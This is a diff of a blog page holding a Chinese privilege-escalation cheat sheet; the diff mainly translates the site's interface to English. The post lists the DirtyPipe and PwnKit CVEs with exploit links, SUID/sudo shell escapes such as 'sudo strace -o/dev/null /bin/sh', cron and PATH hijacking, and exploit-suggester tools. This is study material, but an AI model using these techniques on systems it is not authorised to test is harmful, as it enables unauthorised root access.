@@ -1,7 +1,7 @@
 
 
 <!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=auto>
+<html lang="en" data-default-color-scheme=auto>
 
 
 
@@ -16,13 +16,13 @@
   <meta name="author" content="ixpqxi">
   <meta name="keywords" content="">
   
-    <meta name="description" content="一、Linux提权 (1)通过利用漏洞提权 1、CVE-2016-5195（&quot;脏牛&quot;漏洞） 2、CVE-2022-0847  https:&#x2F;&#x2F;github.com&#x2F;Arinerron&#x2F;CVE-2022-0847-DirtyPipe-Exploit.git 123+ 利用前提 5.8 &lt;&#x3D; Linux kernel &lt; 5.16.11&#x2F;5.15.25&#x2F;5.10.102 123+ 利用流程">
+    <meta name="description" content="一、Linux提权(1)通过利用漏洞提权1、CVE-2016-5195（”脏牛”漏洞）2、CVE-2022-0847 https:&#x2F;&#x2F;github.com&#x2F;Arinerron&#x2F;CVE-2022-0847-DirtyPipe-Exploit.git 123+ 利用前提 5.8 &lt;&#x3D; Linux kernel &lt; 5.16.11&#x2F;5.15.25&#x2F;5.10.102 123+ 利用流程 1.将">
 <meta property="og:type" content="article">
 <meta property="og:title" content="权限提升">
 <meta property="og:url" content="https://ixpqxi.github.io/2022/08/20/46bb6cfbfdcb/index.html">
 <meta property="og:site_name" content="Blog">
-<meta property="og:description" content="一、Linux提权 (1)通过利用漏洞提权 1、CVE-2016-5195（&quot;脏牛&quot;漏洞） 2、CVE-2022-0847  https:&#x2F;&#x2F;github.com&#x2F;Arinerron&#x2F;CVE-2022-0847-DirtyPipe-Exploit.git 123+ 利用前提 5.8 &lt;&#x3D; Linux kernel &lt; 5.16.11&#x2F;5.15.25&#x2F;5.10.102 123+ 利用流程">
-<meta property="og:locale" content="zh_CN">
+<meta property="og:description" content="一、Linux提权(1)通过利用漏洞提权1、CVE-2016-5195（”脏牛”漏洞）2、CVE-2022-0847 https:&#x2F;&#x2F;github.com&#x2F;Arinerron&#x2F;CVE-2022-0847-DirtyPipe-Exploit.git 123+ 利用前提 5.8 &lt;&#x3D; Linux kernel &lt; 5.16.11&#x2F;5.15.25&#x2F;5.10.102 123+ 利用流程 1.将">
+<meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-08-20T07:55:24.000Z">
 <meta property="article:modified_time" content="2025-10-26T05:08:47.410Z">
 <meta property="article:author" content="ixpqxi">
@@ -156,7 +156,7 @@
             <li class="nav-item">
               <a class="nav-link" href="/" target="_self">
                 <i class="iconfont icon-home-fill"></i>
-                <span>首页</span>
+                <span>Home</span>
               </a>
             </li>
           
@@ -168,7 +168,7 @@
             <li class="nav-item">
               <a class="nav-link" href="/projects/" target="_self">
                 <i class="iconfont icon-code"></i>
-                <span>项目</span>
+                <span>Projects</span>
               </a>
             </li>
           
@@ -180,7 +180,7 @@
             <li class="nav-item">
               <a class="nav-link" href="/archives/" target="_self">
                 <i class="iconfont icon-archive-fill"></i>
-                <span>归档</span>
+                <span>Archives</span>
               </a>
             </li>
           
@@ -192,7 +192,7 @@
             <li class="nav-item">
               <a class="nav-link" href="/categories/" target="_self">
                 <i class="iconfont icon-category-fill"></i>
-                <span>分类</span>
+                <span>Categories</span>
               </a>
             </li>
           
@@ -204,7 +204,7 @@
             <li class="nav-item">
               <a class="nav-link" href="/tags/" target="_self">
                 <i class="iconfont icon-tags-fill"></i>
-                <span>标签</span>
+                <span>Tags</span>
               </a>
             </li>
           
@@ -216,8 +216,40 @@
             <li class="nav-item">
               <a class="nav-link" href="/about/" target="_self">
                 <i class="iconfont icon-user-fill"></i>
-                <span>关于</span>
+                <span>About</span>
               </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-global"></i>
+                <span>Language</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/zh-CN/" target="_self">
+                    
+                    <span>中文</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/" target="_self">
+                    
+                    <span>English</span>
+                  </a>
+                
+              </div>
             </li>
           
         
@@ -262,7 +294,7 @@
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
         <time datetime="2022-08-20 15:55" pubdate>
-          2022年8月20日 下午
+          August 20, 2022 pm
         </time>
       </span>
     
@@ -273,7 +305,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.8k 字
+          1.8k words
         
       </span>
     
@@ -284,7 +316,7 @@
         
         
         
-          16 分钟
+          16 mins
         
       </span>
     
@@ -326,11 +358,7 @@
             
               <div class="markdown-body">
                 
-                <h1 id="一linux提权">一、Linux提权</h1>
-<h2 id="通过利用漏洞提权">(1)通过利用漏洞提权</h2>
-<h4 id="cve-2016-5195脏牛漏洞">1、CVE-2016-5195（"脏牛"漏洞）</h4>
-<h4 id="cve-2022-0847">2、CVE-2022-0847</h4>
-<ul>
+                <h1 id="一、Linux提权"><a href="#一、Linux提权" class="headerlink" title="一、Linux提权"></a>一、Linux提权</h1><h2 id="1-通过利用漏洞提权"><a href="#1-通过利用漏洞提权" class="headerlink" title="(1)通过利用漏洞提权"></a>(1)通过利用漏洞提权</h2><h4 id="1、CVE-2016-5195（”脏牛”漏洞）"><a href="#1、CVE-2016-5195（”脏牛”漏洞）" class="headerlink" title="1、CVE-2016-5195（”脏牛”漏洞）"></a>1、CVE-2016-5195（”脏牛”漏洞）</h4><h4 id="2、CVE-2022-0847"><a href="#2、CVE-2022-0847" class="headerlink" title="2、CVE-2022-0847"></a>2、CVE-2022-0847</h4><ul>
 <li><pre><code class="hljs">https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git
 <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> 利用前提<br><br></code></pre></td></tr></table></figure>
 5.8 &lt;= Linux kernel &lt; 5.16.11/5.15.25/5.10.102
@@ -343,24 +371,24 @@
 http://its.dlut.edu.cn/info/1054/78309.htm
 <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> 漏洞介绍<br><br>  权限提升漏洞（CVE-2021-4034)是由于pkexec无法正确处理调用参数，从而将环境变量作为命令执行，具有任意用户权限的攻击者都可以在默认配置下通过修改环境变量来利用此漏洞，从而获得受影响主机的root权限。<br><br><span class="hljs-bullet">+</span> 影响范围<br><br>  Polkit预装在CentOS、Ubuntu、Debian、Redhat、Fedora、Gentoo、Mageia等多个Linux发行版上，所有存在Polkit的Linux系统均受影响。<br><br>  不受影响的Linux版本:<br><br></code></pre></td></tr></table></figure>
 CentOS：
-  CentOS 6：polkit-0.96-11.el6_10.2
-  CentOS 7：polkit-0.112-26.el7_9.1
-  CentOS 8.0：polkit-0.115-13.el8_5.1
-  CentOS 8.2：polkit-0.115-11.el8_2.2
-  CentOS 8.4：polkit-0.115-11.el8_4.2
-
+    CentOS 6：polkit-0.96-11.el6_10.2
+    CentOS 7：polkit-0.112-26.el7_9.1
+    CentOS 8.0：polkit-0.115-13.el8_5.1
+    CentOS 8.2：polkit-0.115-11.el8_2.2
+    CentOS 8.4：polkit-0.115-11.el8_4.2
+    
 Ubuntu：
-  Ubuntu 14.04 ESM：policykit-1-0.105-4ubuntu3.14.04.6+esm1
-  Ubuntu 16.04 ESM：policykit-1-0.105-14.1ubuntu0.5+esm1
-  Ubuntu 18.04 LTS：policykit-1-0.105-20ubuntu0.18.04.6
-  Ubuntu 20.04 LTS：policykit-1-0.105-26ubuntu1.2
-  Ubuntu 21.10：policykit-1-0.105-31ubuntu0.1
-
+    Ubuntu 14.04 ESM：policykit-1-0.105-4ubuntu3.14.04.6+esm1
+    Ubuntu 16.04 ESM：policykit-1-0.105-14.1ubuntu0.5+esm1
+    Ubuntu 18.04 LTS：policykit-1-0.105-20ubuntu0.18.04.6
+    Ubuntu 20.04 LTS：policykit-1-0.105-26ubuntu1.2
+    Ubuntu 21.10：policykit-1-0.105-31ubuntu0.1
+    
 Debain：
-  Debain stretch：policykit-1 0.105-18+deb9u2
-  Debain buster：policykit-1 0.105-25+deb10u1
-  Debain bullseye：policykit-1 0.105-31+deb11u1
-  Debain bookworm,bullseye：policykit-1 0.105-31.1
+    Debain stretch：policykit-1 0.105-18+deb9u2
+    Debain buster：policykit-1 0.105-25+deb10u1
+    Debain bullseye：policykit-1 0.105-31+deb11u1
+    Debain bookworm,bullseye：policykit-1 0.105-31.1
 <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> 版本检测<br><br><span class="hljs-bullet">  +</span> CentOS<br><br></code></pre></td></tr></table></figure>
   rpm -qa polkit
   <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> Ubuntu<br><br></code></pre></td></tr></table></figure>
@@ -376,7 +404,7 @@ Debain：
          --help |
          --disable-internal-agent |
          [--user username] PROGRAM [ARGUMENTS...]
-
+  
   See the pkexec manual page for more details.
   <figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>## (<span class="hljs-number">2</span>)通过第三方应用提权<br><br>#### <span class="hljs-number">1</span>、利用应用的suid提权<br><br>+ suid是Linux中的一种特殊权限,其功能为用户运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。在执行过程中，调用者会暂时获得该文件的所有者权限,且该权限只在程序执行的过程中有效.。所以可以通过利用具有suid权限的第三方应用提权。<br><br>+ 常见具有suid权限的Linux可执行文件<br><br></code></pre></td></tr></table></figure>
 find、vim、less、cp、namp、more、nano
@@ -432,7 +460,7 @@ sudo -l
   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>+ nano的<span class="hljs-built_in">sudo</span>提权<br><br></code></pre></td></tr></table></figure>
   sudo nano
   <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">  <br></code></pre></td></tr></table></figure>
-  curl+T      \\[^T]
+  curl+T        \\[^T]
   <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">  <br></code></pre></td></tr></table></figure>
   whoami
   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>+ man的<span class="hljs-built_in">sudo</span>提权<br><br></code></pre></td></tr></table></figure>
@@ -476,33 +504,27 @@ sudo -l
   <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> strace<br><br></code></pre></td></tr></table></figure>
   sudo strace -o/dev/null /bin/sh
   <figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs clean">  <br><br>## (<span class="hljs-number">3</span>)计划任务提权<br><br>查看Root用户的计划任务<br><br></code></pre></td></tr></table></figure>
-crontab -l -u root  //需要高权限
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>低权限用户可通过查看`/etc/crontab`的方式获取<br><br></code></pre></td></tr></table></figure>
-cat /etc/crontab
-<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>如果发现有root权限的计划任务，并且可文件修改，即可以进行尝试<br><br>## (<span class="hljs-number">4</span>)环境变量劫持提权<br><br>用到的命令<br><br></code></pre></td></tr></table></figure>
-exploit PATH=/tmp:$PATH
-<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>## (<span class="hljs-number">5</span>)Docker容器提权<br><br><br><br># 二、Windows提权<br><br>## <span class="hljs-number">1</span>、通过利用漏洞提权<br><br>利用WES-NG提权辅助工具查找可用的提权漏洞<br><br>项目地址<br><br></code></pre></td></tr></table></figure>
-https://github.com/bitsadmin/wesng
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> 更新漏洞数据库<br><br></code></pre></td></tr></table></figure>
-python3 wes.py --update
-<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><br>+ 在目标主机上执行<span class="hljs-params">system</span>info，获取目标主机的<span class="hljs-params">system</span>info信息<br><br></code></pre></td></tr></table></figure>
-systeminfo &gt; sysinfo.txt
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> 查找提权漏洞<br><br></code></pre></td></tr></table></figure>
-python3 wes.py ~/tmp/sysinfo.txt --impact &quot;Elevation of Privilege&quot;
-<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><br>查找已有公开<span class="hljs-built_in">EXP</span>的提权漏洞<br><br></code></pre></td></tr></table></figure>
-python3 wes.py ~/tmp/sysinfo.txt --impact &quot;Elevation of Privilege&quot; --exploits-only
-<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br># 三、服务器系统<br><br>### (一)Windows<br><br>#### <span class="hljs-number">1</span>、针对环境<br><br>#### <span class="hljs-number">2</span>、提权方法<br><br>#### <span class="hljs-number">3</span>、针对版本<br><br>### (二)Linux<br><br>#### <span class="hljs-number">1</span>、辅助工具Linux_exploit_suggester<br><br></code></pre></td></tr></table></figure>
-https://github.com/mzet-/linux-exploit-suggester
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> 使用<br><br></code></pre></td></tr></table></figure>
-./linux-exploit-suggester.sh
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs"><br>返回结果<br><br></code></pre></td></tr></table></figure>
-[+] [CVE-2022-0847] DirtyPipe
-
-   Details: https://dirtypipe.cm4all.com/             (漏洞介绍)
-   Exposure: probable
-   Tags: [ ubuntu=(20.04|21.04) ],debian=11
-   Download URL: https://haxx.in/files/dirtypipez.c       (EXP下载地址)</code></pre></li>
+</code></pre>
+</li>
 </ul>
+<p>crontab -l -u root  &#x2F;&#x2F;需要高权限</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>低权限用户可通过查看`/etc/crontab`的方式获取<br><br></code></pre></td></tr></table></figure>
+<p>cat &#x2F;etc&#x2F;crontab</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>如果发现有root权限的计划任务，并且可文件修改，即可以进行尝试<br><br>## (<span class="hljs-number">4</span>)环境变量劫持提权<br><br>用到的命令<br><br></code></pre></td></tr></table></figure>
+<p>exploit PATH&#x3D;&#x2F;tmp:$PATH</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>## (<span class="hljs-number">5</span>)Docker容器提权<br><br><br><br># 二、Windows提权<br><br>## <span class="hljs-number">1</span>、通过利用漏洞提权<br><br>利用WES-NG提权辅助工具查找可用的提权漏洞<br><br>项目地址<br><br></code></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> 更新漏洞数据库<br><br></code></pre></td></tr></table></figure>
+<p>  python3 wes.py –update<br>  <figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><br>+ 在目标主机上执行<span class="hljs-params">system</span>info，获取目标主机的<span class="hljs-params">system</span>info信息<br><br></code></pre></td></tr></table></figure><br>  systeminfo &gt; sysinfo.txt<br>  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> 查找提权漏洞<br><br></code></pre></td></tr></table></figure><br>  python3 wes.py ~&#x2F;tmp&#x2F;sysinfo.txt –impact “Elevation of Privilege”<br>  <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><br>查找已有公开<span class="hljs-built_in">EXP</span>的提权漏洞<br><br></code></pre></td></tr></table></figure><br>  python3 wes.py ~&#x2F;tmp&#x2F;sysinfo.txt –impact “Elevation of Privilege” –exploits-only<br>  <figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br># 三、服务器系统<br><br>### (一)Windows<br><br>#### <span class="hljs-number">1</span>、针对环境<br><br>#### <span class="hljs-number">2</span>、提权方法<br><br>#### <span class="hljs-number">3</span>、针对版本<br><br>### (二)Linux<br><br>#### <span class="hljs-number">1</span>、辅助工具Linux_exploit_suggester<br><br></code></pre></td></tr></table></figure><br><a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> 使用<br><br></code></pre></td></tr></table></figure>
+<p>  .&#x2F;linux-exploit-suggester.sh<br>  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs"><br>返回结果<br><br></code></pre></td></tr></table></figure><br>  [+] [CVE-2022-0847] DirtyPipe</p>
+<pre><code class="hljs"> Details: https://dirtypipe.cm4all.com/				(漏洞介绍)
+ Exposure: probable
+ Tags: [ ubuntu=(20.04|21.04) ],debian=11
+ Download URL: https://haxx.in/files/dirtypipez.c		(EXP下载地址)
+</code></pre>
+<pre><code class="hljs">
+</code></pre>
 
                 
               </div>
@@ -554,26 +576,26 @@ https://github.com/mzet-/linux-exploit-suggester
     <div class="license-meta">
       
         <div class="license-meta-item">
-          <div>作者</div>
+          <div>Author</div>
           <div>ixpqxi</div>
         </div>
       
       
         <div class="license-meta-item license-meta-date">
-          <div>发布于</div>
-          <div>2022年8月20日</div>
+          <div>Posted on</div>
+          <div>August 20, 2022</div>
         </div>
       
       
       
         <div class="license-meta-item">
-          <div>许可协议</div>
+          <div>Licensed under</div>
           <div>
             
               
               
                 <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
                     <i class="iconfont icon-by"></i>
                   </span>
                 </a>
@@ -596,7 +618,7 @@ https://github.com/mzet-/linux-exploit-suggester
                       <a href="/2022/09/01/d26b70cf87ba/" title="Metasploit">
                         <i class="iconfont icon-arrowleft"></i>
                         <span class="hidden-mobile">Metasploit</span>
-                        <span class="visible-mobile">上一篇</span>
+                        <span class="visible-mobile">Previous</span>
                       </a>
                     
                   </article>
@@ -605,7 +627,7 @@ https://github.com/mzet-/linux-exploit-suggester
                     
                       <a href="/2022/06/01/2db6629e6caf/" title="git">
                         <span class="hidden-mobile">git</span>
-                        <span class="visible-mobile">下一篇</span>
+                        <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
                     
@@ -622,7 +644,7 @@ https://github.com/mzet-/linux-exploit-suggester
     <div id="giscus" class="giscus"></div>
     <script type="text/javascript">
       Fluid.utils.loadComments('#giscus', function() {
-        var options = {"repo":"ixpqxi/ixpqxi.github.io","repo-id":"R_kgDOMZIPiQ","category":"Announcements","category-id":"DIC_kwDOMZIPic4C-cY_","mapping":"pathname","strict":0,"reactions-enabled":1,"emit-metadata":0,"input-position":"top","theme":"preferred_color_scheme","theme-dark":"preferred_color_scheme","lang":"en","loading":"lazy"};
+        var options = {"repo":"ixpqxi/ixpqxi.github.io","repo-id":"R_kgDOMZIPiQ","category":"Announcements","category-id":"DIC_kwDOMZIPic4C-cY_","mapping":"pathname","strict":0,"reactions-enabled":1,"emit-metadata":0,"input-position":"top","theme":"light","theme-dark":"dark","lang":"en","loading":"lazy"};
         var attributes = {};
         for (let option in options) {
           if (!option.startsWith('theme-')) {
@@ -631,7 +653,7 @@ https://github.com/mzet-/linux-exploit-suggester
           }
         }
         var light = 'light';
-        var dark = 'preferred_color_scheme';
+        var dark = 'dark';
         window.GiscusThemeLight = light;
         window.GiscusThemeDark = dark;
         attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
@@ -670,7 +692,7 @@ https://github.com/mzet-/linux-exploit-suggester
     <div id="toc">
   <p class="toc-header">
     <i class="iconfont icon-list"></i>
-    <span>目录</span>
+    <span>Table of Contents</span>
   </p>
   <div class="toc-body" id="toc-body"></div>
 </div>
@@ -726,7 +748,7 @@ https://github.com/mzet-/linux-exploit-suggester
   <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
     <div class="modal-content">
       <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
         <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
           <span aria-hidden="true">&times;</span>
         </button>
@@ -734,7 +756,7 @@ https://github.com/mzet-/linux-exploit-suggester
       <div class="modal-body mx-3">
         <div class="md-form mb-5">
           <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
         </div>
         <div class="list-group" id="local-search-result"></div>
       </div>
@@ -910,7 +932,7 @@ https://github.com/mzet-/linux-exploit-suggester
   
 
   <noscript>
-    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
   </noscript>
 </body>
 </html>
